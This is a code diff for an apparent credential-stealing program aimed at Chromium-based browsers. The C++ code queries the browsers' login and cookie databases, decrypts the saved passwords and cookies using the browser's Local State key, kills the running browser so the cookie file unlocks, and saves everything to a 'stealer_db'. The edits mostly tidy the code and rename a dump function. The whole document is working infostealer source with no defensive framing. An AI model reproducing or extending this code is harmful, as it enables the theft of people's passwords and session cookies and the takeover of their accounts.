@@ -34,18 +34,14 @@ std::vector<std::string> browsers_chromium = {
 
 BOOL chromium_parser(std::string username, std::string stealer_db)
 {
-	//Hold data
-	//DataHolder* data_array = new DataHolder[SQLITE_ROW];
-	//int data_index = 0;
-
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
 	std::string target_login_data;
 	std::string target_key_data;
 
-	// Those paths that contains \\ at the end means they have the default file 'User Data'
-	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
+	// Those paths that contains '\\' at the end means they have the default file 'User Data'
+	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
 	for (const auto& dir : browsers_chromium) {
 
 		if (dir.back() == '\\')
@@ -63,7 +59,6 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 		target_key_data = target_user_data + "\\Local State";
 
 		try {
-
 			sqlite3_stmt* stmt = query_database(target_login_data, "SELECT origin_url, username_value, password_value FROM logins");
 			
 			if (stmt == nullptr)
@@ -73,7 +68,6 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 			ChromiumDecryptor obj;
 			if (obj.ChromiumDecryptorInit(target_key_data))
 			{
-				//std::cout << target_login_data << std::endl;
 				while (sqlite3_step(stmt) == SQLITE_ROW)
 				{
 					DataHolder data;
@@ -93,23 +87,15 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 						if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
 							continue;
 
-
 						data.setUrl(url);
 						data.setUsername(username);
 						data.setHost(dir);
-
-						/*data_array[data_index].setUrl(url);
-						data_array[data_index].setUsername(username);
-						data_array[data_index].setHost(dir);*/
 
 						try
 						{
 							//decrypt password here
 							std::string decrypted_password = obj.AESDecrypter(password);
-							//data_array[data_index++].setPassword(decrypted_password);
-
 							data.setPassword(decrypted_password);
-
 						}
 						catch(int e)
 						{
@@ -135,14 +121,7 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 		}		
 	}
 
-	// printing stolen data
-	/*for (int i = 0; i<data_index; i++)
-	{
-		data_array[i].print_data();
-	}*/
-
-
-	if (!dump_data(stealer_db, data_list, data_list.size()))
+	if (!dump_password_data(stealer_db, data_list, data_list.size()))
 		return false;
 
 	return true;
@@ -150,10 +129,6 @@ BOOL chromium_parser(std::string username, std::string stealer_db)
 
 BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 {
-	//Hold data
-	//DataHolder* data_array = new DataHolder[SQLITE_ROW];
-	//int data_index = 0;
-
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
@@ -179,12 +154,14 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 		target_key_data = target_user_data + "\\Local State";
 
 		try {
-
 			sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
 
 			if (stmt == nullptr)
 			{
-				kill_process(dir);
+				// cookies file is locked when chromium based browser is running
+				if (!kill_process(dir))
+					continue;
+
 				stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
 				
 				if (stmt == nullptr)
@@ -193,18 +170,16 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 				}
 			}
 
-			//Decrypt Key
+			//Decrypt key
 			ChromiumDecryptor obj;
 			if (obj.ChromiumDecryptorInit(target_key_data))
 			{
-				//std::cout << target_login_data << std::endl;
 				while (sqlite3_step(stmt) == SQLITE_ROW)
 				{
 					DataHolder data;
 
 					char* host_key = (char*)sqlite3_column_text(stmt, 0);
 					char* name = (char*)sqlite3_column_text(stmt, 1);
-					//char* path = (char*)sqlite3_column_text(stmt, 2);
 
 					std::vector<BYTE> cookies;
 					const void* encrypted_value = sqlite3_column_blob(stmt, 3);
@@ -228,9 +203,7 @@ BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
 						{
 							//decrypt cookies here
 							std::string decrypted_cookies = obj.AESDecrypter(cookies);
-
 							data.setCookies(decrypted_cookies);
-
 						}
 						catch (int e)
 						{
